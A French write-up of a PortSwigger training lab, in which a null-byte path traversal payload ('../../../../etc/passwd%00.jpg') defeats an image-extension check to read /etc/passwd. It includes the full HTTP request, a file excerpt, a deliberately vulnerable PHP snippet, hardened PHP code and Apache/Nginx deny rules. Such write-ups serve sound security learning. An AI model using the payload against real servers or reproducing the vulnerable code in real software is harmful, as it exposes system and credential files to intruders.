# File path traversal, validation of file extension with null byte bypass

https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

## Découvertes de la vulnérabilité

### 1. Identification du point d'entrée

Lors de la navigation sur le site e-commerce, nous avons identifié que les images de produits sont chargées via un paramètre `filename` dans l'URL :
```
https://[lab-id].web-security-academy.net/image?filename=22.jpg
```

Ce paramètre contrôle directement quel fichier est récupéré par le serveur, ce qui en fait un vecteur d'attaque potentiel pour une vulnérabilité de type **path traversal**.

### 2. Test de path traversal basique

Première tentative avec des séquences de traversée standard :
```
?filename=../../../etc/passwd
```
**Échec** : L'application valide que le nom de fichier doit se terminer par une extension d'image valide (`.jpg`, `.png`, etc.)

### 3. Bypass avec null byte

La vulnérabilité exploitée repose sur l'utilisation d'un **null byte** (`%00`) pour contourner la validation de l'extension :

**Payload final :**
```
?filename=../../../../etc/passwd%00.jpg
```

**Pourquoi ça fonctionne ?**

1. **Côté validation applicative** : L'application vérifie que la chaîne se termine par `.jpg` → Validation passée
2. **Côté système de fichiers** : En C et dans de nombreux langages bas niveau, le caractère null byte (`\0`) marque la **fin d'une chaîne**. Le système s'arrête donc à `/etc/passwd` et ignore tout ce qui suit le `%00`

**Schéma du fonctionnement :**
```
Requête HTTP    : ../../../../etc/passwd%00.jpg
                                        ↓
Validation app  : Voit "passwd%00.jpg" → Se termine par .jpg
                                        ↓
Système fichier : Lit "passwd\0"      → S'arrête au \0
                                        ↓
Fichier ouvert  : /etc/passwd
```

### 4. Exploitation

**Requête HTTP finale :**
```http
GET /image?filename=../../../../etc/passwd%00.jpg HTTP/1.1
Host: [lab-id].web-security-academy.net
```

## Résultat

### Exploitation réussie

La requête a permis de lire le contenu du fichier système `/etc/passwd`, confirmant la vulnérabilité de path traversal avec bypass de validation.

**Extrait du fichier récupéré :**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

### Impact potentiel

Cette vulnérabilité permet à un attaquant de :
- Lire des fichiers sensibles du système (mots de passe, configurations)
- Accéder aux fichiers de l'application (code source, fichiers de configuration avec credentials)
- Énumérer la structure des répertoires
- Potentiellement exécuter du code si combiné avec d'autres vulnérabilités (LFI → RCE)

**Sévérité : HAUTE**

## Recommandations de sécurisation

### 1. Ne jamais faire confiance aux entrées utilisateur

**Code vulnérable (exemple PHP) :**
```php
$filename = $_GET['filename'];
if (preg_match('/\.(jpg|png|gif)$/i', $filename)) {
    readfile('/var/www/images/' . $filename);
}
```

**Problème :** La validation regex vérifie seulement la fin de la chaîne, mais ne nettoie pas les caractères dangereux comme `../` et `%00`.

### 2. Utiliser une whitelist de fichiers autorisés

✅ **Solution sécurisée :**
```php
$allowed_files = [
    '1' => 'product1.jpg',
    '2' => 'product2.jpg',
    '22' => '22.jpg',
    // etc.
];

$file_id = $_GET['id'];

if (isset($allowed_files[$file_id])) {
    $filename = $allowed_files[$file_id];
    readfile('/var/www/images/' . $filename);
} else {
    http_response_code(404);
    echo "Fichier non trouvé";
}
```

**Avantages :**
- Aucune entrée utilisateur n'est utilisée directement dans le chemin de fichier
- Seuls les fichiers explicitement autorisés peuvent être accédés

### 3. Valider et nettoyer le chemin

Si vous devez accepter des noms de fichiers, utilisez des fonctions de sécurisation :

✅ **Exemple PHP :**
```php
$filename = $_GET['filename'];

// Supprimer les séquences de traversée
$filename = str_replace(['../', '..\\'], '', $filename);

// Supprimer les null bytes
$filename = str_replace(chr(0), '', $filename);

// Obtenir seulement le nom de fichier (pas le chemin)
$filename = basename($filename);

// Valider l'extension
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if (!in_array(strtolower($ext), ['jpg', 'png', 'gif'])) {
    die('Extension non autorisée');
}

// Utiliser realpath pour résoudre le chemin final
$filepath = realpath('/var/www/images/' . $filename);

// Vérifier que le chemin final est bien dans le répertoire autorisé
if (strpos($filepath, '/var/www/images/') !== 0) {
    die('Accès non autorisé');
}

readfile($filepath);
```

### 4. Configuration du serveur web

**Apache (.htaccess) :**
```apache
# Bloquer l'accès aux fichiers sensibles
<FilesMatch "\.(conf|env|log|passwd|shadow)$">
    Require all denied
</FilesMatch>
```

**Nginx :**
```nginx
location ~ /\.(conf|env|log|passwd|shadow)$ {
    deny all;
}
```

### 5. Principe du moindre privilège

- Exécuter l'application web avec un utilisateur système aux privilèges limités
- Limiter les permissions de lecture aux seuls répertoires nécessaires
- Utiliser un environnement chrooté ou conteneurisé (Docker) pour isoler l'application

### 6. Tests de sécurité

Effectuer régulièrement :
- Revues de code avec focus sur la gestion des fichiers
- Tests d'intrusion (pentesting)
- Analyses statiques du code (SAST)
- Scans de vulnérabilités automatisés

## Conclusion

Cette vulnérabilité illustre l'importance de :
1. **Ne jamais faire confiance aux entrées utilisateur**
2. **Implémenter plusieurs couches de défense** (validation, nettoyage, vérification finale)
3. **Préférer les whitelists aux blacklists**
4. **Tester les contournements possibles** (null bytes, encodage, etc.)

La simple validation de l'extension n'est pas suffisante face à des techniques de bypass comme le null byte injection.